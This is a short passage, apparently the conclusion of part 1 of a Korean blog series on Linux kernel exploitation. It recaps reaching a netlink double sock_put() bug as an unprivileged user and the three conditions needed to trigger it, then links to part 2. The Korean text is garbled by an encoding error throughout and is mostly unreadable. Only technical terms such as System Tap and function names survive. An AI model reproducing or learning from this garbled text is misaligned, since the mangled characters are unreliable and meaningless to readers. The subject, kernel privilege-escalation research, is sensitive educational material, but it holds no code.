ì´ë²ˆ ì²« ë²ˆì§¸ íŒŒíŠ¸ì—ì„  ë¦¬ëˆ…ìŠ¤ ì»¤ë„ ì´ˆì‹¬ìë¥¼ ìœ„í•´ í•µì‹¬ ì»¤ë„ ë°ì´í„° êµ¬ì¡°ì™€ ë ˆí¼ëŸ°ìŠ¤ ì¹´ìš´íŒ… facilityë¥¼ ì†Œê°œí–ˆë‹¤. ê³µê°œë˜ì–´ ìˆëŠ” ì •ë³´(CVE description, íŒ¨ì¹˜)ë¥¼ ë³´ë©° ë²„ê·¸ì— ëŒ€í•´ ë” ì˜ ì´í•´í•˜ê²Œ ë˜ê³  ê³µê²© ì‹œë‚˜ë¦¬ì˜¤ë„ ì‘ì„±í–ˆë‹¤.

ê·¸ë¦¬ê³  ìµìŠ¤í”Œë¡œì‡ ê°œë°œì„ ì‹œì‘í•˜ì—¬ ê¶Œí•œì´ ì—†ëŠ”(unprivileged) ì‚¬ìš©ìë¡œë¶€í„° ë²„ê·¸ì— ì‹¤ì œë¡œ ë„ë‹¬í•  ìˆ˜ ìˆë‹¤ëŠ” ê²ƒì„ ê²€ì¦í–ˆë‹¤. ê·¸ ê³¼ì •ì—ì„œ í›Œë¥­í•œ ì»¤ë„ ë„êµ¬ System Tapì„ ì†Œê°œí–ˆë‹¤. ë˜í•œ ì²« ë‚œê´€(library wrappers)ë¥¼ ë§ˆì£¼í–ˆê³  ì´ë¥¼ ê°ì§€í•˜ëŠ” ë²•ì„ ë³´ì•˜ë‹¤.

System Tapì˜ Guru Modeë¥¼ ì´ìš©í•˜ì—¬ ì»¤ë„ ì˜ì—­ì—ì„œ íŠ¸ë¦¬ê±°ê°€ ë˜ë„ë¡ ë§Œë“¤ê³  ì´ì¤‘ *sock\_put()* ë²„ê·¸ë¥¼ í™•ì‹¤íˆ ë§Œë“¤ì–´ë‚¼ ìˆ˜ ìˆìŒì„ ê²€ì¦í–ˆë‹¤. ë²„ê·¸ë¥¼ íŠ¸ë¦¬ê±°í•˜ê¸° ìœ„í•´ì„  ì„¸ ê°€ì§€ê°€ í•„ìš”í–ˆë‹¤:

1. *netlink\_attachskb()*ê°€ 1ì„ ë°˜í™˜í•˜ê²Œ ë§Œë“¤ê¸°
2. ìµìŠ¤í”Œë¡œì‡ ìŠ¤ë ˆë“œ unblockí•˜ê¸°
3. ë‘ ë²ˆì§¸ *fget()* í˜¸ì¶œì´ NULLì„ ë°˜í™˜í•˜ê²Œ ë§Œë“¤ê¸°

ë‹¤ìŒ íŒŒíŠ¸ì—ì„  System Tapì„ í†µí•´ ì»¤ë„ì„ ìˆ˜ì •í–ˆë˜ ë¶€ë¶„ì„ í•˜ë‚˜ í•˜ë‚˜ ëŒ€ì²´í•  ê²ƒì´ë‹¤. ìœ ì € ì˜ì—­ì˜ ì½”ë“œë§Œìœ¼ë¡œ ë²„ê·¸ë¥¼ íŠ¸ë¦¬ê±°í•˜ëŠ” proof-of-concept ì½”ë“œë¥¼ ì ì§„ì ìœ¼ë¡œ ë§Œë“œëŠ” ê²ƒì´ë‹¤.

ì»¤ë„ ì˜ì—­ ìµìŠ¤í”Œë¡œì‡ ì—¬ì •ì„ ì¦ê²¼ê¸¸ ë°”ë€ë‹¤. ì´ì œ [part 2](https://chamalane.herokuapp.com/posts/5d5035f8c040080004228196)ì—ì„œ ë³´ì!
